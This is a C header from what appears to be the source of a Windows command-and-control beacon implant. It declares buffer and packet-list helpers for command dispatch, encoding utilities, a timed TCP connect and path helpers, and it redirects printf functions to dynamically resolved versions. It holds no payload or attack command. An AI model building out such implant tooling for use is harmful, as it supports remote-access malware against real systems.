#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <stddef.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

/*
 * 代码风格约定：
 * 1. 自定义函数统一使用 ModuleAction 或 ModuleActionObject 形式（BbInit / ProfileLoad）。
 * 2. 不新增 snake_case 函数名；外部兼容符号（WinAPI / CRT / BOF API）保持原名。
 * 3. 新代码优先使用 Windows 大写类型（BOOL / INT / UINT / DWORD / SIZE_T / WCHAR）。
 * 4. 指针类型按现有模块风格书写，跨 WinAPI 边界可使用 PVOID / PDWORD / LPVOID。
 * 5. 局部注释保持简短，只解释边界、状态机和非显然分支。
 * 6. 函数内部按“校验 -> 核心逻辑 -> 清理/返回”分组，适当留空行。
 */

/* 字节类型 */
typedef BYTE BYTE8;

/* 动态字节缓冲区 */
typedef struct ByteBuf {
    BYTE8* data;                /* 数据指针 */
    SIZE_T len;                 /* 当前有效长度 */
    SIZE_T cap;                 /* 已分配容量 */
} ByteBuf;

/* 数据包列表（用于命令分发返回多个包） */
typedef struct PacketList {
    ByteBuf* items;             /* 数据包数组 */
    SIZE_T count;               /* 当前数量 */
    SIZE_T cap;                 /* 数组容量 */
    INT items_are_final;        /* 是否为最终数据包 */
    INT should_exit;            /* 是否要求 beacon 退出 */
} PacketList;

/* ===== ByteBuf 操作 ===== */

VOID BbInit(ByteBuf* b);                               /* 初始化缓冲区 */
VOID BbFree(ByteBuf* b);                               /* 释放缓冲区 */
INT BbReserve(ByteBuf* b, SIZE_T need);                /* 确保至少 need 字节可用空间 */
INT BbAppend(ByteBuf* b, const VOID* data, SIZE_T len);/* 追加原始字节 */
INT BbU8(ByteBuf* b, UINT8 v);                         /* 追加 uint8 */
INT BbU16(ByteBuf* b, UINT16 v);                       /* 追加 uint16（大端序） */
INT BbU32(ByteBuf* b, UINT32 v);                       /* 追加 uint32（大端序） */
INT BbU64(ByteBuf* b, UINT64 v);                       /* 追加 uint64（大端序） */
INT BbBytes(ByteBuf* b, const VOID* data, SIZE_T len); /* 追加长度前缀字节块 */
INT BbString(ByteBuf* b, const CHAR* s);               /* 追加长度前缀字符串 */
INT BbPrintf(ByteBuf* b, const CHAR* fmt, ...);        /* 格式化追加 */
ByteBuf BbFromText(const CHAR* s);                     /* 从文本创建缓冲区 */

/* ===== PacketList 操作 ===== */

VOID PlistInit(PacketList* list);                      /* 初始化列表 */
VOID PlistFree(PacketList* list);                      /* 释放列表 */
INT PlistAdd(PacketList* list, ByteBuf item);          /* 添加数据包 */

/* ===== 字符串与编码工具 ===== */

WCHAR* Utf8ToWide(const CHAR* s);                      /* UTF-8 → Wide（HeapAlloc） */
CHAR* WideToUtf8(const WCHAR* s);                      /* Wide → UTF-8（HeapAlloc） */
CHAR* SystemToUtf8(const CHAR* data, UINT cp);         /* 指定代码页 → UTF-8 */
CHAR* SystemBytesToUtf8(const BYTE8* data, SIZE_T len, UINT cp); /* 字节数据代码页 → UTF-8 */
CHAR* HeapStrDupA(const CHAR* s);                      /* ANSI 字符串复制（HeapAlloc） */
WCHAR* HeapStrDupW(const WCHAR* s);                    /* Wide 字符串复制（HeapAlloc） */
VOID HexEncode(const BYTE8* data, SIZE_T len, CHAR* out, SIZE_T out_len); /* 字节 → hex 字符串 */
UINT64 GetUnixTimestamp(VOID);                         /* 获取 Unix 时间戳（秒） */
VOID DebugPrintf(const CHAR* fmt, ...);                /* 调试输出（OutputDebugStringA） */

/* 大端序读写原语：操作裸字节缓冲区，与 BbU16/BbU32（写入 ByteBuf）互补 */
UINT16 BeReadU16(const BYTE8* p);                      /* 读取大端 uint16 */
UINT32 BeReadU32(const BYTE8* p);                      /* 读取大端 uint32 */
VOID BeWriteU16(BYTE8* p, UINT16 v);                  /* 写入大端 uint16 */
VOID BeWriteU32(BYTE8* p, UINT32 v);                  /* 写入大端 uint32 */

/*
 * 带超时的非阻塞 TCP 连接。
 * 将 socket 设为非阻塞发起 connect，select 等待可写，再恢复阻塞模式。
 * 返回 0 表示成功，非 0 为 WSA 错误码。调用方负责关闭失败时的 socket。
 * timeout_ms <= 0 时使用默认 10 秒。
 */
INT TcpConnectNonblocking(SOCKET s, const struct sockaddr* addr, INT addr_len, INT timeout_ms);

/* 动态解析的格式化接口（避免静态链接 CRT printf） */
INT FmtVscprintfA(const CHAR* fmt, va_list ap);
INT FmtVsnprintfA(CHAR* dst, SIZE_T dst_len, const CHAR* fmt, va_list ap);
INT FmtSnprintfA(CHAR* dst, SIZE_T dst_len, const CHAR* fmt, ...);
INT FmtSnprintfW(WCHAR* dst, SIZE_T dst_len, const WCHAR* fmt, ...);

/* 宏重定向：项目中的 snprintf/vsnprintf/_vscprintf/swprintf_s 自动走动态解析 */
#ifndef BEACON_NO_FORMAT_REDIRECT
#define snprintf   FmtSnprintfA
#define vsnprintf  FmtVsnprintfA
#define _vscprintf FmtVscprintfA
#define swprintf_s FmtSnprintfW
#endif

/* 以反斜杠分隔符合并两个路径段（left 为空时直接复制 right；调用方 HeapFree） */
WCHAR* PathJoinWide(const WCHAR* left, const WCHAR* right);

/* 解析为绝对路径（失败时退回原串；调用方 HeapFree） */
WCHAR* PathFullWide(const WCHAR* path);

/* 将 Win32 文件属性转换为 Unix 风格模式字符串（写满 16 字节含 NUL） */
VOID FsModeStringFromAttrs(DWORD attrs, CHAR out[16]);
